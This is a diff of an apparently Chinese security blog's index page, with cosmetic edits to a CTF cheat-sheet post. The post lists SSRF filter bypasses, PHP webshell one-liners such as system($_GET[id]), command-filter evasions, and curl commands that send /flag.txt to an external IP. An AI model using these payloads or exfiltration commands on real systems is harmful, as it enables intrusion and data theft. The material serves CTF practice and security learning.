@@ -134,14 +134,13 @@ xmlhttp.onreadystatechange=function()
 }
 xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
 xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
-xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>name传入表达式-&gt;dump加载一个dom  <script></p>
-<p>可以看总结：<a href="https://xz.aliyun.com/t/5084">https://xz.aliyun.com/t/5084</a></p>
+xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>可以看总结：<a href="https://xz.aliyun.com/t/5084" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084</a></p>
 <h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>当一个同源站点，同时存在两个页面，其中<strong>一个有CSP保护的A页面</strong>，<strong>另一个没有CSP保护B页面</strong>。</p>
 <p>那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效<br><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1dd8b6jsku4c129k14vflmutk5p.png-59.6kB"></p>
 <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>各种绕过姿势在笔记里有</p>
 <h2 id="过滤指定字符串"><a href="#过滤指定字符串" class="headerlink" title="过滤指定字符串"></a>过滤指定字符串</h2><p>用unicode编码绕过localhost的限定</p>
 <pre><code>LocalHost = localhost = ⓛocaⓛhost </code></pre><p><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1ddi759agea21r3r1587uju11ch1r.png-21.1kB"></p>
-<h2 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h2><p>数字地址(十进制)：127.0.0.1->2130706433<br>十六进制：127.0.0.1->0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1->0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1->127.1</p>
+<h2 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h2><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
 <p>在吐司学的一招：如果302跳转(准确的说是http协议)禁用IPV4的规则传入，可以用IPV6绕过：</p>
 <pre><code>http://[::ffff:127.0.0.1]/
 也可以缩写成 http://[::1]/</code></pre><h2 id="check内网ip段绕过"><a href="#check内网ip段绕过" class="headerlink" title="check内网ip段绕过"></a>check内网ip段绕过</h2><p>php过滤代码如下</p>
@@ -154,13 +153,13 @@ xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="跨域"><a href="#跨域"
 2. http://foo@127.0.0.1:80@baidu.com/flag.php
 
 3. http://%5B::%5D:22/</code></pre><p>第一种是0.0.0.0掩码绕过<br>第二种白名单是baidu.com，黑名单是127x网段<br>第三种是绕过主机名探测，用[::]替代127.0.0.1</p>
-<h2 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h2><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
+<h2 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h2><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
 <h2 id="file协议妙用"><a href="#file协议妙用" class="headerlink" title="file协议妙用"></a>file协议妙用</h2><p>我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p>
 <p><img src="http://static.zybuluo.com/1160307775/osyc4y4bkxtkyuy286wrpuh0/image_1ddqj7884117n43j19vu1rgn347p.png" alt="image_1ddqj7884117n43j19vu1rgn347p.png-54.3kB"></p>
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>sql语句查询mysql操作日志:<a href="http://www.cnblogs.com/jhin-wxy/p/8965888.html">http://www.cnblogs.com/jhin-wxy/p/8965888.html</a></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>sql语句查询mysql操作日志:<a href="http://www.cnblogs.com/jhin-wxy/p/8965888.html" target="_blank" rel="noopener">http://www.cnblogs.com/jhin-wxy/p/8965888.html</a></p>
 <h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="利用报错和外带ood来读取本地文件"><a href="#利用报错和外带ood来读取本地文件" class="headerlink" title="利用报错和外带ood来读取本地文件"></a>利用报错和外带ood来读取本地文件</h2><p><img src="http://static.zybuluo.com/1160307775/o09e0gt16woeslut7mcjthgm/image_1def8qqag1frb1pfu1ghq1lkvbhf9.png" alt="image_1def8qqag1frb1pfu1ghq1lkvbhf9.png-81.8kB"></p>
-<h2 id="利用本地xxe来bypass协议不回显的情况"><a href="#利用本地xxe来bypass协议不回显的情况" class="headerlink" title="利用本地xxe来bypass协议不回显的情况"></a>利用本地xxe来bypass协议不回显的情况</h2><p><a href="https://xz.aliyun.com/t/5503">https://xz.aliyun.com/t/5503</a></p>
-<p><a href="https://www.jishuwen.com/d/2EGU">https://www.jishuwen.com/d/2EGU</a></p>
+<h2 id="利用本地xxe来bypass协议不回显的情况"><a href="#利用本地xxe来bypass协议不回显的情况" class="headerlink" title="利用本地xxe来bypass协议不回显的情况"></a>利用本地xxe来bypass协议不回显的情况</h2><p><a href="https://xz.aliyun.com/t/5503" target="_blank" rel="noopener">https://xz.aliyun.com/t/5503</a></p>
+<p><a href="https://www.jishuwen.com/d/2EGU" target="_blank" rel="noopener">https://www.jishuwen.com/d/2EGU</a></p>
 <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><pre><code>1、改content-type?
 2、是否存在解析漏洞 .php.xxx
 3、是否可以上传其它能解析的后缀？
@@ -177,7 +176,7 @@ xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="跨域"><a href="#跨域"
 </li>
 </ul>
 <h1 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h1><h2 id="常识-2"><a href="#常识-2" class="headerlink" title="常识"></a>常识</h2><p>获取flag文件并用Curl协议外带到自己的vps</p>
-<pre><code>curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;</code></pre><pre><code>curl -T ./flag.txt http://50.16.48.95/</code></pre><h2 id="命令执行Bypass"><a href="#命令执行Bypass" class="headerlink" title="命令执行Bypass"></a>命令执行Bypass</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><pre><code>ca\t /f\lag</code></pre><h3 id="双引号-分号-复杂变量"><a href="#双引号-分号-复杂变量" class="headerlink" title="双引号&分号--复杂变量"></a>双引号&分号--复杂变量</h3><p>PHP复杂变量：<a href="https://xz.aliyun.com/t/4785">https://xz.aliyun.com/t/4785</a></p>
+<pre><code>curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;</code></pre><pre><code>curl -T ./flag.txt http://50.16.48.95/</code></pre><h2 id="命令执行Bypass"><a href="#命令执行Bypass" class="headerlink" title="命令执行Bypass"></a>命令执行Bypass</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><pre><code>ca\t /f\lag</code></pre><h3 id="双引号-amp-分号–复杂变量"><a href="#双引号-amp-分号–复杂变量" class="headerlink" title="双引号&amp;分号–复杂变量"></a>双引号&amp;分号–复杂变量</h3><p>PHP复杂变量：<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">https://xz.aliyun.com/t/4785</a></p>
 <pre><code>${system(whoami)}</code></pre><p><img src="http://static.zybuluo.com/1160307775/ze8sakz6ijx1zx262kicbqnj/image_1dcp3bus82rs1ugp15ij1l75121e9.png" alt="image_1dcp3bus82rs1ugp15ij1l75121e9.png-79.6kB"></p>
 <h1 id="常见的过滤bypass"><a href="#常见的过滤bypass" class="headerlink" title="常见的过滤bypass"></a>常见的过滤bypass</h1><h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><p>绕过<code>&lt;?</code>限制的一句话和php标签限制</p>
 <pre><code>&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</code></pre><p>动态执行函数</p>
@@ -185,12 +184,12 @@ xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="跨域"><a href="#跨域"
 $_GET[1]($_GET[0]);
 
 2、过滤了括号的时候可以用大括号，但是php版本有要求，不过phpstudy没试出来
-$_GET{1}($_GET{0});</code></pre></script></p>
+$_GET{1}($_GET{0});</code></pre>
                 
             </div>
             <div class="continue">
             <a href="/2025/01/01/CTF比赛常用-持续更新/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -245,7 +244,7 @@ window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id
             </div>
             <div class="continue">
             <a href="/2019/07/02/前端全局变量劫持/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -324,7 +323,7 @@ $result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</co
             </div>
             <div class="continue">
             <a href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -433,7 +432,7 @@ with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:
             </div>
             <div class="continue">
             <a href="/2019/04/08/西湖论剑2019-Writeup/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -528,7 +527,7 @@ imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;
             </div>
             <div class="continue">
             <a href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -622,7 +621,7 @@ chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关�
             </div>
             <div class="continue">
             <a href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -666,7 +665,7 @@ chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关�
             </div>
             <div class="continue">
             <a href="/2019/03/25/0CTF2019-Web1WriteUp/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -711,7 +710,7 @@ url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=
             </div>
             <div class="continue">
             <a href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -765,7 +764,7 @@ Location: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE
             </div>
             <div class="continue">
             <a href="/2019/02/14/Oauth2的两类漏洞挖掘/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1102,7 +1101,7 @@ function make_var($val)
             </div>
             <div class="continue">
             <a href="/2019/02/02/Echsop2.7.x几处漏洞分析/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1110,7 +1109,7 @@ function make_var($val)
 </section>
 
   <nav class="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
   </nav>
 
     </main>
